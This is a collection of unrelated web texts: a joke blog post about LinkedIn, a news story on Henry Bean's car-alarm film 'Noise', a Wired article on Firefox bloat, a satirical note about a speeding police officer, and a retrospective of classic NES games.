I have 12,500 people in my third tier network .
Could they help me find a good barber ?
LinkedIn is supposed to help you find a job .
I do n’t want a new job , but if I did , would the fact that I ’m in Linked In help ?
I could approach a potential employer and say , “ Wait a minute , are you THE Jim Boswell ?
Yeah !
It ’s me , Marion , I ’m in your fifth tier .
You know Sally who knows
Dave who knows Walton who knows Simon who sent me an invitation because I ’m in his Google contact list !
So , do I get the job ? ”
LinkedIn is kind of cool , and a lot of people are doing it , but for me … I still do n’t get it .
Maybe somebody in my third tier can help explain it to me .
* Update * Looks like I ’m not the only one …
A couple days after writing this , and we have stats released saying Linked In traffic is up 323 % but other responding and questioning whether that means much .
ROME ( Reuters ) -
Have you ever dreamt of smashing up that car in your neighborhood whose burglar alarm has the bad habit of going off in the middle of the night ?
Tim Robbins smiles during a photocall to promote the film " Catch A Fire , " in Madrid January 15 , 2007 .
" Noise " , director Henry Bean 's provocative second film , casts Tim Robbins as David , an upper - class family man driven insane by New York 's loud sounds .

U.S. director Henry Bean used to do that just that , breaking into other people ’s cars to disable their alarms , so he could get a good night ’s sleep .
He ended up in court and in jail , until he decided to stop and make a film about it .
“ Noise ” , Bean ’s provocative second film , casts Tim Robbins as David , an upper - class family man driven insane by New York ’s loud sounds -- grinding garbage trucks , horns honking , back - up beepers and worst of all , car alarms squealing at all hours .
He becomes so obsessed with noise that he turns into a black - clad vigilante , “ The Rectifier ” , waging his own crusade on those damn alarms shattering his quiet .
After ending in jail and nearly sinking his marriage , he decides to try to go about his fight legally , collecting signatures for a petition which he hopes will get the issue on the ballot at an upcoming council election .
The initiative is hugely popular but is blocked by the city ’s slimy mayor , played by William Hurt , forcing David to resort to an extreme strategy to make his point .
“ Going out to break into a car whose alarm had been going off for hours , getting arrested , going to jail , appearing before a judge , all that happened to me , I did that , ” Bean , who lives in New York , told reporters after his film premiered at the Rome festival to critical acclaim .
“ When I got arrested I had already been doing it a lot .
I had been doing it for years .
But when I spent the night in jail and it cost me several thousands dollars , I began to think I was n’t getting anywhere by pursuing it in this way , ” he said .
“ I confess that a couple of times I could not control myself afterwards and I went out and did it again and did n’t get arrested those times ...
In fact you ’ll never find a policeman who will tell you that these things ( car alarms ) do any good whatsoever , ” he said .
METAPHOR FOR POWER
The film is Bean ’s witty , often laugh - out - loud funny second installment in a trilogy exploring religious , political and artistic fanaticism .
His first film “ The Believer ” , about a Jewish man who becomes a neo - Nazi skinhead , won the Grand Jury prize at the Sundance festival in 2001 but was so controversial that no major U.S. distributor picked it up .
Bean has also worked as a writer for films such as “ Basic Instinct 2 ” .
Despite his own personal battle against car alarms , which according to Bean “ should be totally illegal ” , the director said his film was , above all , about the disconnect that he feels exists between those in power and their citizens .
“ For me , noise becomes a metaphor for power .
The noise that I have to listen to , that I have no control over , that invades my house , my ears , my thoughts ... in a way that ’s how our governments are , ” he said .
“ We live in a world where the governments are extremely unresponsive to what the citizens want . ”
When Firefox launched in beta release five years ago , it burst on the open - source browser scene like a young Elvis Presley – slim , sexy and dangerous .
Since then it has attracted millions of users , generally set the agenda for browser development and unseated Microsoft 's Internet Explorer as the de facto monopoly in the field .
But , with Firefox 3.0 poised for release later this year , the " IE killer " is in danger of morphing into an early Fat Elvis , if increasing numbers of die - hard fans turned reluctant critics are any guide .
Anecdotal reports of problems , from sluggishness to slow page loads and frequent crashes , have begun circulating in web forums , along with increasingly loud calls for Firefox to return to its roots .
The alleged culprit : bloat , the same problem that once plagued Mozilla , the slow , overstuffed open - source browser spawned by Netscape that Firefox was originally meant to replace .
" Remember when ( Firefox ) was the ' light ' browser , and if you wanted to load it down that was your choice ?
Let 's go back to that , " summed up one reader in a Wired News poll this month aimed at identifying the most urgently needed Firefox fixes .
When Firefox 1.0 arrived in November 2004 , it was hailed as one of free software 's crowning achievements .
A team of far - flung volunteers had created a slimmed - down , standards - compliant web browser that beat the pants off Internet Explorer , which then dominated the market with 90 percent share estimates .
After strong early adoption by zealots and open - source advocates , Firefox started to win over non -geek users .
In two years , the browser had carved out a 15 percent share of the market – a once unthinkable chunk – and it 's still gaining ground .
But it 's leaving many of those new users perplexed .
Why is the elegant , community - built application suddenly behaving badly ?
In our poll , readers rated Firefox 's mysterious habit of gobbling up every remaining scrap of a computer 's memory their No. 1 gripe about the browser .
Complaints of slow performance and instability ranked highly as well .
Statistics are hard to come by , but our own experiences with the browser include crashes , memory hogging , molasses - slow page loads and the spinning beach ball of death .
The problems are even worse for Mac users , so much so that last month , Firefox developer Colin Barrett broached the question on his blog :
What sucks about Firefox on the Mac ?
Mike Schroepfer , Mozilla 's vice president of engineering , concedes that performance can be an issue , especially with memory handling .
But he 's also quick to place the blame outside the browser .
" Memory usage is dependent on the environment , " he says .
" Other software , add - ons , extensions and other things can impact performance . "
Ah , yes , those damned add - ons .
When Blake Ross first started hacking away at the Mozilla Suite code to create what would eventually become Firefox , one of his goals was to slim the browser down by moving any nonessential functionality into a framework of user - customizable extensions .
Today , popular add - ons for the browser include file - sharing tools , remote controls for iTunes and slick - looking user - interface enhancements .
Certainly , Firefox 's infinitely customizable nature remains one of its most - loved features .
But those third - party add - ons can also be the source of many Firefox woes .
As users pimp their browsers to the extreme , they introduce a greater potential for performance problems .
In an effort to stamp out incompatibilities between extensions , the Firefox team has slowly been adding standard features that were previously available as add - ons .
Firefox 2.0 , released in November 2006 , saw the addition of an inline spell - checker , an RSS reader and a new search engine manager .
Since then , however , complaints have become more visible than ever .
When the final beta of Firefox 2.0 was released last year , the bloat controversy spilled over on popular geek community site Slashdot .
" I really wish Firefox would go back to the lightweight browser it once was , " one commenter wrote .
" The power was the ability to have extensions to do anything you wanted , but it was my choice which ones I wanted using my system resources . "
Firefox developers have so far ignored that advice .
More enhancements , such as a data manager for microformats , are expected when Firefox 3 arrives in late 2007 .
If the suggestions playing out on blogs , forums and bulletin boards are any indication , however , a return to Firefox 's original principles of modular design may be the most desired feature for the next release .
Mozilla 's Schroepfer says so - called feature creep is always a concern to his coders .
To counteract that , he says , the main criterion for accepting new features has been that they enhance the browser without bogging it down .
" The general philosophy , and one of the reasons it takes so long to get features in the browser , is that any new features should not affect the startup time or performance of the browser , " he says .
To keep the bulk down , Schroepfer says his team sets a high threshold for the addition of features .
New features are n't built in unless they are useful to at least 90 percent of Firefox 's users .
" If power users want something richer than that , they can turn to extensions , " he says .
Despite those safeguards , some now - standard features could be adversely affecting performance .
Firefox 's page - cache mechanism , for example , introduced in version 1.5 , stores the last eight visited pages in the computer 's memory .
Caching pages in memory allows faster back browsing , but it can also leave a lot less memory for other applications to use .
Less available RAM equals a less - responsive computer .
Firefox addresses this issue somewhat , setting the default cache lower on computers with less than a gigabyte of RAM .
Though the jury is still out on where the perfect balance between too many and too few features lies , one truth is apparent :
The new web is pushing our browsers to the limit .
Ajax , Flash and other rich application technologies certainly do threaten to push the browser harder than it can handle , but those developments are irreversible .
Unfortunately , as the web has grown , so have user expectations .
" The real cause of web bloat and feature creep is the rich content offered on the web these days , which goes so far beyond vanilla HTML in its performance demands , " says open - source advocate Bruce Perens .
Another equally potent factor could be pushing Firefox inexorably toward complexity .
Slowly but surely , Internet Explorer is catching up to Firefox .
In IE7 , Microsoft added tabbed browsing and integrated RSS support to its browser .
If Firefox is going to continue to compete , it will need to up the ante , but it must do so without making users add extensions ( and possibly introduce those compatibility problems ) .
" I do believe that Firefox must contain more ' awesome ' functionality out of the box , " says blogger Chris Pirillo .
" Otherwise , you 're having to run a browser with a zillion plug-ins – and none of them aware that other plug- ins might be running . "
For the record , Pirillo says he swears by the lightweight Maxthon browser .

You : Big white cop driving a big cop car .
I knew you were the one for me as soon as you blasted past me on the frontage road alongside Peachtree Industrial .
I was driving a sedate 45 MPH down the frontage road when you blew past me on the right , at about 80 MPH , no cop lights on , and no headlights on either .
" He must be after someone for sure ! " I said to myself , " otherwise he would have passed me on the left at a normal speed like a normal person , rather than on the right at an unsafe speed like some kind of maniac ! "
Why , it would be silly to drive like that for no reason at all .
What a brave policeman you must be , I imagined , going after some bad guy in such a speedy yet stealthy manner !
Well , imagine my surprise when you pulled into the very same QuikTrip I was heading for .
I was turning in to fill up my left front tire , which has a persistent slow leak .
I thought , you must be chasing a criminal !
Particularly when you screamed into the parking lot at high speed ( luckily it was deserted !
Heavens ! ) and came to a stop straight across at least two spaces .
Oh , I hope this nice QuikTrip is n't being robbed !
But , no , it seems you were only stopping for a refreshment , judging by your sedate walking pace .
My , what a large round ass you have , Mr Policeman !
And a big jolly belly too !
As I glared at you in obvious consternation through my window , you must have noticed my beauty and virtue even from across the parking lot , because you chose that very moment to let your little light shine ( flashlight , that is ) in my direction .
Hello there !
Do n't mind me , I 'm just trying to stay alive long enough to fill this pesky tire , and check the others too !
Tee hee !
You schlumped into the store , and then you waddled out shortly afterwards , refreshments in hand .
It must have been quite a , you poor , starving thing .
I 'm sure if it was anything other than dire need , you would have managed to live off the fat of the land there for another few minutes ... ah , but who am I , a mere law - abiding citizen , to second - guess you , a Man Both Of And Above The Law ?
Clearly , you were wondering about me too , as you again directed your hard , long shaft of flashlit desire in my direction .
Did you realize how you missed me ?
( To tell the truth , you just barely missed me . )
Did you wonder what I was doing back there , all alone in the dark , handling my tiny , tight little air hose ?
( It 's free at QT , you know . )
How I hoped you 'd come to inquire as to the state of my tires and my safety -- me , a woman alone late at night with obvious mechanical concerns .
Why , it would only be the deed of a good citizen , to come and check on a comely , lonely lass !
Alas , no , you did not , although had you done so , you would have seen that my registration is a month out of date .
Oops , how embarrassing !
Ah well , perhaps our paths will cross again , oh chubby star - crossed starlit speeding object of my vehicular affections and infractions .
Until then , I will miss your recklessness and obvious , but I will survive ... as best I can .
Godspeed , brave sir , and good luck cuffing your next Coca - Cola collar !
The Games That Defined The Nintendo NES
The Nintendo Entertainment System is legendary in the video game world .
Nintendo virtually came out of nowhere to invade the world with a reborn love for home - based video games .
To fuel the revolution , Nintendo and a skilled group of third parties loaded the NES library with a wealth of high quality 8 - bit games that would not only ingrain themselves in the minds of youngsters , but set standards for video game generations to come .
With so many nostalgic favorites , it was difficult to have a comprehensive list without rambling on forever .
I did my best to narrow the list down to what I thought were the games that defined what made the NES great and hold the most memories for retrospective gamers everywhere .
If I missed mentioning your personal favorite , I apologize , but I would love to hear your story .

Super Mario Bros .
Series
Before the NES , the home video game industry almost crumbled into non-existance .
Shigeru Miyamoto ’s Super Mario Bros. came to the rescue just in time by bringing bright and vivid graphics , a magical environment , and addictive gameplay to a tired industry .
In addition to saving the gaming industry it also helped position Nintendo as a new powerhouse in the home video game industry , dethroning the likes of Atari .
Though not terribly difficult , Super Mario Bros.
struck a wonderful level of challenge with its various enemies , pitfalls , and occasional secrets ( such as the variety of warp pipes scattered about the game ) .
Coupled with its then - impressive graphics and catchy tunes , Super Mario Bros. was just impossible to ignore .
( Even today , it ’s landscapes and musical themes are etched into our minds )
After the tremendous success of the first Super Mario Bros. game , you can imagine the anticipation of a sequel .
In Japan , Nintendo had a direct Super Mario Bros. sequel , but it was deemed too difficult for the American gaming audience .
To remedy this situation , Nintendo repackaged another Japanese platforming game , known as Doki Doki Panic , with Mario - themed sprites and the name Super Mario Bros .
2 . The results were a game that puzzled many young Mario fans , but managed to be and bizarrely entertaining .
In this new Mario installment , gamers were actually able to play as one of four different characters : Mario , Luigi , Princess Peach , and Toad .
Each character had a unique characteristic that gave them certain situational advantages against other characters .
In a magical land where was a need to pull vegetables and throw them at enemies and jump far distances , there was a bit of strategy involved in character selection .
For all the complaints Super Mario Bros 2 received , it was an interesting change of pace for Mario fans and remains a quirky nostalgia trip for many .
With a feature - length movie ( The Wizard ) serving as the ultimate commercial , Super Mario Bros .
3 was one of the most hyped and anticipated games of all time ( and for good reason ) .
It took everything that worked in the original Super Mario Bros. game and gave it a makeover that was bordering on 16 - bit innovation .
Super Mario Bros. 3 featured eight , more unique worlds , each containing numerous levels , used an innovative map navigation system that blew the minds of many a Mario fan .
While staying true to the format of the original , SMB3 introduced new gameplay elements including special suits that gave Mario new abilities and a number of new powerups .
Super Mario 3 simply did exactly what it needed to do as a Mario sequel .
Nearly every level presented a flawless degree of challenge and the adventure itself was long and varied .
Nintendo fine - tuned its skill at creating a fun - filled presentation with tons of hidden secrets to be found leaving players with an amazing ride from beginning to end .
The influence of the Super Mario Bros series on the NES was increasingly apparent throughout the 8 - bit and 16 - bit eras as numerous platformer clones emerged from nearly every publisher on every console .
However , very few could even contend with the original .
The Legend of Zelda
Much like he did with Mario , Shigeru Miyamoto changed the video game landscape with his other pet project , titled The Legend of Zelda .
As many of us know , the game followed a young boy named Link who was chosen by destiny to save the royal Princess Zelda , gather the mythical Triforce of Wisdom pieces , and overthrow the evil Ganon .
Miyamoto based The Legend of Zelda on experiences that he had in local forests , lakes , and caves around his Kyoto home .
One memory that stood out for him was discovering a large cave .
This is something that is a recurring them in The Legend of Zelda series .
Zelda introduced many players to role - playing elements that were undiscovered by most gamers at the time .
In addition to being able to roam around the territory of Hyrule and battle in real - time , the player was able to talk to other people and collect currency to buy extra weapons and power - ups .
It was also a huge thrill when you stumbled upon a treasure chest filled with rupees ( the currency ) or other goodies .
These all seem very common today , but in the early NES days , this was a fresh and experience for many .
Zelda ’s gameplay was also different from anything we had seen before .
It offered players the chance to play the role of a character , and to utilize his strengths to wage battles with enemies .
The main difference from other games , however , was there was no set path — you must chose where to go .
One of the most interesting aspects of Zelda at the time was its freedom and ability to fight or not depending on your mood .
Typical battles are not neccessary , but they are valuable , especially if you desperately need heart or rupees .
And the difficulty really begins to kick in when five or more monsters are on the one screen in a total melee of confusion , dodging , shielding and attacking .
The adrenalin really gets pumping with only half of a heart left , and you have got to do everything possible to save yourself .
It ’s a sense of survival , and its this feeling that keeps the player hooked on this game for hours on end .
Zelda is obviously considered a spiritual forerunner of the console role - playing genre ( Action RPGs , in particular ) as it broke many of the conventions of PC RPGs with its use of cartoonish graphics , real - time battles , and magical selection of music .
It also brought role - playing gameplay to a wider audience which establishing one of the most powerful brands in gaming .
Metroid
Produced by the legendary Gunpei Yokoi , one of the more influential software and hardware designers at Nintendo , Metroid was a groundbreaking title in many areas .
It was one of the first ( if not the first ) home video games that featured scrolling along both the X - and Y - axis , and starred a female protagonist , Samus Aran – a sharp contrast to the “ Save The Princess ” plot motif that was the norm at the time .
But more - so than these achievements , what was truly groundbreaking was its non-linear gameplay and minimalist environments and music .
The action of Metroid is very simple .
Samus has been directed to search the planet Zebes for Space Pirate activity and stop their plans of using a parasitic organism , called a Metroid , against galactic civilization .
Scattered throughout Zebes are numerous power - ups that strengthen Samus ’ firepower and stamina .
Collecting these power - ups is necessary to gain enough power to challenge the Space Pirates and their leader , the Mother Brain .
Speed also plays an important role , as different endings are triggered by different completion times , giving rise to the current concept of game “ speed runs ” and “ sequence breaks ” .
Metroid ’s non-linear world design instantly set itself apart from other games of the same era .
Instead of a relentless progression forward to an arbitrary “ end ” , backtracking to previous areas was encouraged , and even required for advancement .
The player ’s character , Samus Aran , must scour every nook and cranny of the entirely alien Zebes in the hope of finding the one power - up that would unlock the next area .
It is interesting to note that the level designers were very careful to make sure the player could not easily enter , and get stuck in , an area that required a specific power - up to get through or back out of .
The atmosphere of the world itself also ran counter to the usual presentation of that time .
Instead of bright , flashy colors , Zebes ’ backdrop was plain , flat black .
No sky , no clouds .
The lack of any visible background or reference of an “ outside ” further to drive the sense of exploration of ancient tunnels and claustrophobia in the player .
Dotting the foreground , and providing the platforms to navigate , is spritework that evokes “ alien ” and “ ancient ” .
Why are there faces etched in some of the stones where Samus first appears ?
Overall , Metroid had an unusually somber and mature narrative , atmosphere , and music considering it was a first - party Nintendo product .
Prior to Metroid , Nintendo released mostly generic sports games and simple arcade - style action games .
Metroid proved that video games could demand more from players than simple memorization and quick reflexes .
The game was ahead of its time back in 1986 , and now , 20 years later , the Metroid franchise remains on the forefront of innovation in the video game industry .
Duck Hunt
Ducks are evil .
Or so Nintendo would have you believe .
A game that trained many a future hunter in their formative years , Duck Hunt is an example of elegant simplicity as well as a practical demonstration of simple technology .
As one of the pack - in games for the NES , it was hard to find an 80’s kid that did n’t play Duck Hunt at some point in time .
There was something magical about being able to shoot the NES Zapper at the TV and watch the ducks get knocked down .
Many of us also wanted to be able to shoot the dog , but every game has its flaw .
By today ’s standards Duck Hunt would be considered a cheap free flash game .
When it was new , though , it allowed players to do what few other games had allowed them to do – shoot their TV .
The graphics and audio are as expected for an early NES game , which is to say simple by the standards of even later NES games .
The visuals could be considered cute and charming , though , and do not detract from the game .
The audio , on the other hand , can at times be a bit obnoxious .
The gunshot sounds more like a running water faucet than a gun .
Gun games have not seen great popularity on home systems over the years despite many valiant attempts such as Namco ’s guncon games .
Perhaps the popularity of Duck Hunt is due to the simplicity .
Perhaps the popularity is due to the fact that the game was included with most Nintendo systems .
If you ’ve been living on the moon and have never played Duck Hunt perhaps there are other gun games you might want to try .
Games with more substance .
Then again , though , maybe it is all about shooting the ducks .
After all , ducks are evil . 🙂
Other than Super Mario Bros , Duck Hunt is one of the most iconic games from the NES , serving as inspiration for artwork at shows such as iam8 bit , serving as a mini- game in Wario Ware , and being one of the most anticipated remakes on the Nintendo Wii .
Excitebike
It is very rare for a sport - related title to age well .
Improvements in technology , changes in taste from the general public , and switches in direction from video game companies have killed many a so - called “ classic . ”
And then there ’s Excitebike .
More than 20 years have passed since Excitebike became an early release for the NES and it still plays like it ’s brand new .
The graphics are anything but realistic and the sound effects have a bad tinny sound to them , but the game is just pure , unadulterated fun .
The premise of the game is unbelievably simple , as you race your red and white motocross bike along five obstacle - laden courses and try to reach the finish line before your opponents .
The game scrolls horizontally and you move your character up and down the lanes to avoid opponents and stationary obstacles .
The game ’s controls were as straightforward as could be , but there was a surprising amount of strategy hidden in those controls .
The A and B buttons were used for acceleration , but the A button also gave you a turbo boost for quicker acceleration .
This acceleration came at the cost of some engine overheating , however .
If you spend too long in the “ red zone ” and your engine would overheat , so you ’d have to take a short breather while it cooled down .
The trick in Excitebike was to modulate the regular acceleration with just enough turbo to keep you going quickly , without killing the engine in the process .
Keeping an eye on engine temperature was only a part of your challenge as there were also the many jumps on the course that you had to prepare for and take advantage of .
Because you could tilt your bike backward and forward while in midair , you need to angle your bike downward when landing on the backside of a hill to maintain your momentum .
Who would have thought such as simple game could be so deep ?
There are also two modes of play in Excitebike .
Mode A allows you to race alone so that you ’re attempting to beat the clock .
Mode B adds computer controlled characters to race against and most likely crash into .
Hit them from the back and they fall over , while they can do the same thing to you .
A cool track editor ( albeit an archaic one ) rounds off the package and adds a lot of replay value .
It actually works quite well , offering the ability to add just about any hill , bump , or patch of dirt available in the game .
The lack of a way to save your custom made tracks is really the biggest flaw .
Overall , Excitebike is a true classic that just about every NES owner and / or Nintendo fan should have .
Contra
Up , Up , Down , Down , Left , Right , Left , Right , B , A , Start .
Sound familiar ?
Yes , Contra was the one game that almost single - handedly invented the “ cheats ” community .
This Konami classic was also a legendary shooter that kept spaceships from having all the fun and instead defined the “ run - and - gun ” sub -genre .
Contra , a side - scrolling , two - player shoot - ’em - up , let you ( and a friend ) play as a commando on a mission to blow away an alien invasion force .
The game ’s awesome selection of weapons , inventive and exciting levels , and frustrating difficulty level collectively raised the bar for what could be expected of action games .
Did I mention Contra is hard ?
Yes , one brush with an enemy or a single hit from a bullet meant certain death , and you only had three lives and a handful of continues to deal with .
With enemies showing up in all sorts of places and bullets coming at you from all angles , any sane newbie to the game would want to throw the game out the window in order to rid themselves of the panic attack .
But somehow , Contra turned gamers who were normally sane into twitchy gamers who became obsessed with progressing a bit further than last time just so they could defeat this masterpiece of a game .
The firepower you are provided with does help you reach your goal .
In addition to being able to shoot in any direction , the power - ups throughout the levels provide great assistance .
You start with a standard rifle , and can acquire machine guns , flamethrowers , and lasers .
The weapons all have their own distinct advantages to match the player ’s style .
Smart bombs and invincibility power - ups are also available to aid the destruction .
Contra also had some different levels to break up the gameplay such as the “ behind - the - character ” levels where players must hit certain targets to blow open security doors while avoiding enemy fire , bombs , and rolling canisters .
This mode involves ducking fire , waiting for the right moment , and attacking .
It may not be quite as engaging as the main side - scrolling levels , but they provided a great diversion .
Overall , Contra was a landmark game in the action genre and many of its developers moved on from Konami to start their own development house known as Treasure .
These masterminds went on to create more cult classic action titles such as Gunstar Heroes , Radiant Silvergun , Guardian Heroes , Ikaruga , and Bangai-O .
Mike Tyson ’s Punch - Out !!
There was something special about Mike Tyson ’s Punch
Out that drew me in as a kid in the 80’s .
Maybe it was the relatively large character sprites that seemed like a cartoon or the outlandish personalities they each portrayed .
Perhaps it was the trill of starting out as the up - and - coming boxer by the name of Little Mac and finally figuring out how to conquer a menacing opponent .
It ’s hard to put your finger a single characteristic that made Punch - Out so memorable , but it remains as a iconic classic that has never quite been matched .
As Mac , you simply faced one humorously stereotypical opponent after another until you eventually reached the champ , Mike Tyson ( who could send you to the canvas in one punch ) .
What made this game different from previous boxing games outside of the Punch - Out series was its gameplay style , great presentation , and the unique characters .
Once you devoted yourself to Punch - Out for several days and learned the each opponent ’s patterns , the first 12 boxers slowly became a test of your memory and timing .
But once you entered the ring with Macho - Man , your skills were defined by whether you could duck his Super Macho punch .
However , that would only be a prelude to the “ toughest ” boss of all - time .
Kid Dynamite , himself , Mike Tyson took countless knock - out inducing upper-cuts at you for the first minute and a half of the fight .
Most players had contests as to who could last the longest , or better yet , simply last through the first 1:30 of the first round .
Beating Mike Tyson was a mere afterthought .
However , every elementary school in the 80’s had one kid who said he beat Mike Tyson , but did n’t have any proof to back it up .
Even 20 years later , beating Mike Tyson is one of the biggest accomplishments any gamer can have .
Castlevania Trilogy
Konami’s other hardcore action series on the NES was the Dracula - hunting Castlevania trilogy .
And much like Contra , Castlevania was filled with deep gameplay and steep difficulty .
However , as opposed to the immediate onslaught of action in Contra , the whip - lashing gameplay starts out a bit milder as Castlevania draws you into it ’s creepy castle .
As Simon Belmont , you will fight everything from dogs to Death itself in his quest to defeat Dracula .
The game is perfect for fans of the horror genre , with all the zombies , skeletons , bats , ghosts , and so much more .
And who could forget the pesky medusa heads that moved up and down and always managed to get in your way just as you were jumping over a gap .
In addition to dodging all the creepy obstacles , Castlevania required lots of practice time to figure out how each of the levels worked , and which secondary weapons were appropriate for each scenario .
The latter half of the game was filled with enemies that moved in eclectic patterns , requiring you to be patient and wait for the right time to move and attack .
By the time you reached the Grim Reaper ’s level , each hit would take away a quarter of your health , so you would die quickly if you were careless .
As if the original Castlevania was n’t difficult enough , Konami treated hardcore fans for a more intense outing with the two follow - up games .
In addition to pushing the limits of your gameplay skills , but the later installments ( particularly part 3 ) also pushed the limits of what the NES could do with some great 8 - bit graphics .
Kirby ’s Adventure
Kirby ’s Dreamland for the Game Boy , Kirby ’s first appearance , laid the foundation for the gameplay and general feel of the many Kirby games to follow .
But Kirby ’s Adventure for the NES also made some additions , the most notable being Kirby ’s power stealing ability .
This has become a hallmark of the series and the character , and it ’s hard to imagine the adorable little cream puff without it .
The game was released in 1993 , very late in the console ’s very long life ( The NES was released in October , ’ 85 in the USA ) and even several years into the 16 - bit wars .
As a result , the game differs quite a bit from much earlier releases .
While many NES games have barren and bland - looking surroundings , Kirby ’s are lush and colorful .
After almost ten years of working with the NES , Kirby ’s developers probably knew it from the inside out , thus resulting in one of the most gorgeous games on the system .
Like Super Mario Bros 3 , Kirby looked like an early SNES game with a smaller color pallete .
Kirby had an advantage on Mario 3 , however , as it was the largest licensed NES cart at 6 Mbit .
Kirby himself is a beautiful vibrant pink , the worlds he passes through are delicious lime greens , ice blues , chocolate browns – the rich colours do not attempt to emulate 16 bit , but instead try to make 8 bit as beautiful as possible .
The attention to detail incredible as Kirby ’s character animations are about as good as they get on the NES .
Another element that strikes me every single time I play is the relative low level of difficulty .
Mega Man and Contra fans were definitely surprised when they first played this game .
Again , the timing of the release probably played a big role .
NES games as a whole were definitely hard , and most series gradually got easier so as to lower frustration and appeal to a wider audience .
As a whole , Kirby ’s Dreamland truly showed off what the Nintendo Entertainment System could do in terms of audio , video , and gameplay resulting in a game that should not be missed by classic Nintendo fans .
Final Fantasy
Looking back at 1987 , it ’s interesting to think that Squaresoft ( now Square / Enix ) was on the verge of bankruptsy , and as legend has it , the original Final Fantasy was a “ Final ” effort to save the company with a “ Fantasy ” game .
As it turns out , the game sold incredibly well in Japan keeping it from being Square ’s final game .
Final Fantasy not only saved Square from bankruptcy , but gave them the second most popular role - playing game franchise in the country ( after Enix ’s Dragon Quest ) .
Thanks to some heavy promotion from Nintendo of America , the North American version of Final Fantasy also sold modestly well .
Two decades and countless sequels later , there is no denying that Final Fantasy is probably one of the most well known franchises in gaming history .
Gameplay - wise , the original Final Fantasy is probably known for it ’s difficulty level and the ability to choose your own party .
Those that played it for the NES will remember the days that you had to target a different enemy from your ally , or else you ’d attack thin air if that monster died .
They ’ll also remember the need for power leveling before having to go venture into a dungeon , since each new dungeon was becoming more and more difficult .
At the time , Final Fantasy also had a rather innovative storyline which involved elaborate myths and time travel .
This lead to a deeper experience that many claim to be better than Enix ’s Dragon Quest .
With these groundbreaking characteristics , Final Fantasy , along with the original Dragon Quest , proved to be one of the most influential early console role - playing games , and played a major role in legitimizing and popularizing the genre .
Fans obviously love this title as Square / Enix ca n’t help but releasing a number of remakes on a variety of platforms , especially mobile devices .
While all of these remakes contain various tweaks have been made in a variety of different areas , including graphics , sound , and specific gameplay elements .
However , at the heart of each port , the core legacy of this NES classic lives on .
Kid Icarus
Kid Icarus was , unfortunately , a rather unknown game for most American kids in the 1980s who depended solely on Nintendo Power for their gaming recommendations .
For some reason , Nintendo failed to promote this gem of a game properly .
This all comes as a surprise considering Kid Icarus was essentially a sister game to Metroid ( they were both designed by Gunpei Yokoi via the same game engine ) .
While Metroid introduced more revolutionary ideas like open - ended exploration and showing players areas they could not reach until they found a new item , Kid Icarus stuck a little closer to the platformer roots , but attempted to add a little more story and characterization with items that could be found and used along the way .
Kid Icarus also differs greatly from Metroid in terms of atmosphere as it is set in a fantasy world , loosely based on and Greek mythology , by the name of “ Angel Land ” .
Kid Icarus is also deceptively deep for an 8 - bit action platformer due to its use of RPG elements .
The enemies you kill throughout the game are worth experience points at the end of each level as opposed to keeping a traditional score .
Like an RPG , you also have increases in life meter and attack strength at certain experience point levels .
After defeating enemies , you also have the opportunity to collect hearts , which are used as currency to purchase items for your adventures ( Kid Icarus was one of the first platformers to have an inventory system ) .
Luckly , word of Kid Icarus spread among the more dedicated NES fans and eventually established a cult following .
The enthusiasm for the game has continued for many gaming generations as a rumored sequel has been heavily been discussed for nearly every subsequent Nintendo platform from the SNES to the DS and Wii .
Fans are still waiting for Nintendo to make their day .
Mega Man Series
While it may be true that Capcom overused the Mega Man series in the 21st century without any significant innovation , you ca n’t deny that Mega Man was a cutting edge series on the NES .
Mega Man combined fast - paced platform shooting with imaginative robot levels and bosses that reward you with inventive gun power ups .
Each game in this established series is essentially the same , with the ability to slide around and charge your gun being the only major changes .
The basic formula of the Mega Man series is jumping and shooting through themed levels filled with creative robotic enemies before duking it out with the level ’s Robot Master .
After defeating that Robot Master , you acquire their special power .
Those power can then be used in later levels to take advantage of the later opponents ’ weaknesses rock / paper / scissors - style .
Therein lies the genius of the Megaman series .
The original Mega Man was a respectible game ( even though it had hideous box art ) , but Mega Man 2 is where the series really took off .
From a gameplay standpoint , Mega Man 2 did n’t necessarily do anything wildly different from the original .
However , the game was just a class act from top to bottom –resounding proof that games do n’t need to be innovative to be amazing , they just need to be finely polished .
Part of what makes the game so memorable is just how much attention to detail must have gone into it .
Every stage offered its own unique opponents and challenges , and certain enemies would only appear maybe once or twice in the entire game .
As well , the collection of weapons and special abilities you gradually earned transformed Mega Man from the basic run-jump - and - shoot video game hero into a versatile powerhouse .
You can tell Mega Man 2 is a true classic simply because you can go back and play it right now , and it ’s still fun and impressive even after all this time .
Mega Man 3 ( where sliding was added ) was also one of the favorites of the series , but many will say that part 4 is where the series started to go downhill .
Mega Man 4 introduced the Charge Shot , an ability that allowed Mega Man to charge his primary weapon , the Mega Buster , and release a blast much stronger than his normal attack and could sometimes go through multiple enemies .
Because of this , the series started downplaying the special weapons which made the series so special .
The later installment each incrementally added some nice little features and we respectible games , but most will argue that Mega Man 2 is the peak of the series .
R.C. Pro-Am
Rareware ’s RC Pro AM brought vehicular combat to the 8 - bit generation and created its own subset of the racing genre .
Borrowing its dynamic isometric point of view , slick controls , and quick gameplay , many games followed suit .
Rock and Roll Racing being the most obvious , but even Mario Kart utilized the zany powerup idea birthed in RC Pro-Am .
Its essence can be felt in games even today .
Other elements introduced in RC Pro-Am would be the obvious track based upgrades ( for Acceleration , Top Speed , and Grip ) , vehicle upgrades ( you start as a truck , move to a van , then finally a race car ) , and weapons ( bombs , rockets , and generic ammo stars ) .
The superstar powerup , however , was the rollcage which can give you or your opponents ( including bots ) invincibility and the ability to run you off the road temporarily .
Even with plenty of ammunition , you still have to know how to drive to win an RC Pro Am race .
The first few stages are fairly straight forward , but soon after , the benefits and hazards come in full force .
Zippers ( red arrow tips in series ) will temporarily increase your speed to maximum for a short distance but there is a plethora of hazards to avoid such as water slicks and retractable walls that will wreck you instantly .
Later on in the game , there are some truely inventive and challenging tracks .
There are some stages where you will be on a trail of zippers and then randomly there will be a popup wall – timed so that if you were the second one off the mark and maintained a decent speed , it will hit you right as you arrive , everyone else will make it just fine .
Or the oilsicks right in the way of a perfect drift off a zipper around a turn .
RC Pro-Am shows really the epitome of what classic games were , amazing gameplay coupled with damn near impossible tracks .
But that brings up another point I have yet to touch on , drifting .
To win RC Pro-Am you must master the vehicles drifting .
Since it is a two button game , shoot and go , drifting is achieved by taping turn , and not holding it down .
Drifting does slow you down and provides you with what some consider and annoying sound , but it gives you an offensive edge in that if you know what you are doing , you can begin to drift , take out an enemy , then tighten your drift around their wrecked hull and pass them .
